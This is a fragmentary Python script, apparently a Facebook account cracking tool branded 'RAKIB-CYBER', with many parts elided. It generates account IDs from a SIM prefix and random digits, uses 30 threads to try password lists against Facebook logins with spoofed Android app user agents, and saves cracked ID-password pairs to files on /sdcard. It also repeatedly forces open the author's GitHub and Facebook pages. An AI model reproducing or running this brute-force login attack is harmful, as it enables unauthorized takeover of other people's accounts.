...
try:
    ...
    print('\n \033[1;91m[\033[1;93mRAKIB-CYBER-420\033[1;91m]\033[1;97m installing requests !...\n')
    time.sleep(0.5)
...
try:
    ...
    print('\n \033[1;91m[\033[1;93mRAKIB-CYBER-420\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mRAKIB-CYBER-420\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
...
try:
    ...
    if "Bangladesh" not in ___ccc___:
       os.system('xdg-open https://github.com/rakibcy')
...
try:
    os.system('clear')
    srv=requests.get('https://raw.githubusercontent.com/rakibcy/SPIDER/main/srv.txt').text 
    if "update" in srv:
        os.system('clear')
        for j in range(3000):
            time.sleep(0.5)
            os.system('xdg-openhttps://github.com/rakibcy')
...
os.system('xdg-open https://www.facebook.com/id=100080123630781')
def logo():
    os.system('clear')
    print(f"""               
\033[38;5;46m########     ###    ##    ## #### ########     
...
def mahadi():
    ...
    if _____mahadi_____ in ['A','a','01','1']:
        ...
        os.system('xdg-openhttps://m.me/j/AbYTyKL9Ov7Y4VgK/')
...
def ___uids___():
    ...
    os.system('xdg-open https://www.facebook.com/profile.php?id=100001896913641')
    ...
    with tred(max_workers=30) as SefatMahadi:
        ...
        print(f'{green}┣━[{rad}+{green}] SIM CODE    {yelloww}: {white} {code} ')
        print(f'{green}┗━[{rad}+{green}] IF NO RESULT {rad}[{yelloww}ON{white}/{yelloww}OFF{rad}] {green}AIRPLAN MODE')
        linex()
        for love in user:
           ids = code+love
           bu = love[:6]
    ...
    print(f"{white}[{green}+{white}] TOTAL ID : {green}{len(oks)}")
    linex()
    exit()
...
def ___random___(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{rad}[{green}RAKIB-CYBER{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}RAKIB:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
         ...
         #   ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
           ...
           # ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2076};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print('\r\r\033[1;31m[\033[1;32mRAKIB\033[1;31m]\033[1;32m '+uid+' | '+pas+'\033[1;97m')
                    open('/sdcard/RAKIB-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                print(f'\r\r\x1b[38;5;208m[DIED] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/RAKIB-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
